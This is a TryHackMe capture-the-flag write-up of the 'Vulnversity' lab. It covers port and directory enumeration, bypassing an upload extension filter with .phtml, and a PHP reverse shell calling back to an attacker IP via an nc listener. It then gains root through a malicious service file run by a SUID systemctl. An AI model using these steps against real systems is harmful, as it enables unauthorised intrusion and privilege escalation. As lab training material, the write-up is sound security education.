# Vulnversity — TryHackMe (Easy, Linux)

> Web → Unrestricted File Upload → Reverse Shell → SUID (`systemctl`) → root

**Difficulty:** Easy
**OS:** Linux (Ubuntu)
**Skills:** port enumeration, directory brute-forcing, file upload filter bypass, reverse shells, SUID privilege escalation (GTFOBins)

---

## 1. Enumeration

### Port scan

A full port scan revealed the web service was **not** on port 80 — a reminder that "no port 80" does not mean "no web."

| Port | Service | Version |
|------|---------|---------|
| 21   | FTP     | vsftpd 3.0.5 |
| 22   | SSH     | OpenSSH |
| 139/445 | SMB  | Samba 4 |
| 3128 | HTTP proxy | Squid 4.10 |
| 3333 | HTTP    | Apache httpd 2.4.41 |

```bash
nmap -sC -sV -p- $IP
```

SMB exposed only `print$` and `IPC$` (both administrative shares — a trailing `$` marks them as hidden/restricted, nothing anonymously accessible). Squid and Apache version-based exploit hunting led nowhere — a dead end I spent too long on (see Lessons Learned).

### Directory brute-force on port 3333

The right reflex once an HTTP port is found: brute-force directories **before** chasing version exploits.

```bash
gobuster dir -u http://$IP:3333/ -w /usr/share/dirb/wordlists/common.txt
```

Among the standard asset folders (`css/`, `js/`, `fonts/`, `images/`) one directory stood out:

```
internal/   (Status: 301)
```

`internal/` is by definition something that shouldn't be public — that's where the foothold lived.

---

## 2. Foothold — Unrestricted File Upload

`http://$IP:3333/internal/index.php` served an **Upload** form. Arbitrary files returned:

```
Extension not allowed
```

This is **not** a CVE and not a product exploit — it's a hand-written form with an **extension filter**. The vulnerability class is *unrestricted file upload bypass*, and the answer (which extension slips through) is found by **testing**, not by searching.

### Mapping the filter with Burp Suite

Intercepting the upload request in Burp and editing the extension on the fly made testing fast. `.php` was blocked; **`.phtml` passed the filter and the server executed it as PHP.**

### Reverse shell

Kali ships a ready-made PHP reverse shell:

```bash
locate php-reverse-shell.php
# /usr/share/webshells/php/php-reverse-shell.php
```

Edit two values to point back at the attacker box:

```php
$ip   = 'TUN0_IP';   // your VPN (tun0) address
$port = 4444;
```

Start a listener, upload the file as `.phtml`, then **call it from the browser** (the step that actually triggers execution):

```bash
nc -lvp 4444
# browse to: http://$IP:3333/internal/uploads/shell.phtml
```

Shell received as `www-data`:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 3. Privilege Escalation — SUID `systemctl`

First reflex on any Linux box: list SUID binaries.

```bash
find / -perm -u=s -type f 2>/dev/null
```

Most of the list is standard on any Ubuntu (`sudo`, `su`, `passwd`, `mount`, `pkexec`, …). One entry does **not** belong there:

```
/bin/systemctl
```

A service manager running SUID is the escalation path. [GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/) gives the technique: a SUID `systemctl` runs any service as root, so define a service whose `ExecStart` grants a permanent root path.

The cleanest payload: make `/bin/bash` itself SUID, then drop into a root shell with `bash -p`.

```bash
echo '[Service]
Type=oneshot
ExecStart=/bin/bash -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > /tmp/root.service

systemctl link /tmp/root.service
systemctl enable --now /tmp/root.service

bash -p
id
```

```
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
```

Root achieved. Flags redacted.

```
/root/root.txt → [REDACTED]
```

---

## Lessons Learned / Where I Got Stuck

Honest notes — the mistakes taught more than the wins.

- **searchsploit rabbit hole.** I hunted product CVEs for Squid, Apache, and even the upload form. The form was hand-written — no CVE could ever match it. *Lesson: when there's no product, there's no CVE; think in technique classes (file upload bypass), not exploit databases.*
- **Forgot to trigger the reverse shell.** I uploaded the `.phtml` and sat waiting on the listener — uploading alone does nothing; the file only runs when you **request it** from the browser.
- **Confused my own Kali paths with the target's.** Early FTP enumeration had me referencing `/home/kali/...` — my box, not the target.
- **GTFOBins placeholders.** I copied the template verbatim and ran it with `/path/to/command` still in it. Those are blanks to fill, not literal paths.
- **Nested quotes broke the service file.** In a dumb shell, `'...chmod...'` inside an outer `'...'` closed the string early and mangled the file. Fixed by using double quotes inside: `-c "chmod +s /bin/bash"`. *Always `cat` the file before linking it.*

---

## Attack Chain Summary

```
nmap → 3333 Apache → gobuster → /internal/ → upload form
  → .phtml bypasses extension filter → PHP reverse shell → www-data
  → find SUID → systemctl → GTFOBins service → chmod +s /bin/bash → bash -p → root
```
